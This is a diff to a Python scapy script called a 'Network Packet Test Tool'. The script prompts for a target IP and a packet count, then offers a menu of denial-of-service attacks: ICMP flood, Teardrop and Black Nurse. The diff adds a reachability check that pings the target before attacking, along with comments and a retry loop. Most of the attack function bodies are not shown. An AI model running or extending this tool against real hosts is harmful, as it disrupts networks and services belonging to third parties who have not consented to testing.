@@ -36,9 +36,23 @@ def list_active_interfaces():
                 print(f"- {iface} : {ip}")
                 active_ifaces.append(iface)
         except Exception:
-            # Interface might not have IP or be down
             continue
     return active_ifaces
+
+def is_ip_reachable(dst_ip):
+    print(f"[+] Checking if {dst_ip} is reachable...")
+    pkt = IP(dst=dst_ip) / ICMP()
+    try:
+        response = sr1(pkt, timeout=2, verbose=0)
+        if response:
+            print(f"[+] {dst_ip} is reachable.")
+            return True
+        else:
+            print(f"[-] {dst_ip} is not responding to ICMP echo request.")
+            return False
+    except Exception as e:
+        print(f"[!] Error checking IP reachability: {e}")
+        return False
 
 def send_flood(dst_ip, src_ip, iface, count):
     print(f"[+] Sending {count} ICMP packets from {src_ip} to {dst_ip} on interface {iface}")
@@ -58,20 +72,31 @@ def send_blacknurse(dst_ip, src_ip, iface, count):
 def main():
     print("=== Network Packet Test Tool ===")
 
-    dst_ip = get_user_input("Target IP address: ")
+    # Get and verify reachable target IP
+    while True:
+        dst_ip = get_user_input("Target IP address: ")
+        if is_ip_reachable(dst_ip):
+            break
+        else:
+            retry = get_user_input("Do you want to try a different IP? (y/n): ", valid_options=["y", "n"])
+            if retry == "n":
+                print("[-] Exiting.")
+                sys.exit(1)
 
+    # Number of messages
     n_msg = int(get_user_input("Messages to send: "))
 
+    # List and choose interface
     active_ifaces = list_active_interfaces()
     if not active_ifaces:
         print("[-] No active interfaces found with valid IP addresses.")
         sys.exit(1)
-
     iface = get_user_input(f"Interface to use (choose from above): ", valid_options=active_ifaces)
 
     local_ip = get_if_addr(iface)
     print(f"\n[+] Using local IP {local_ip} as source IP for all packets")
 
+    # Choose attack type
     print("\nSelect attack type:")
     print("1) Flood\n2) Teardrop\n3) Black Nurse")
     attack_type = get_user_input("Your choice (1/2/3): ", valid_options=["1", "2", "3"])
@@ -97,6 +122,6 @@ def main():
     print(f"Time elapsed: {duration:.2f} seconds")
     print(f"Total packets sent: {n_msg}")
     print(f"Approx. speed: {speed:.2f} packets/sec")
-    
+
 if __name__ == "__main__":
     main()
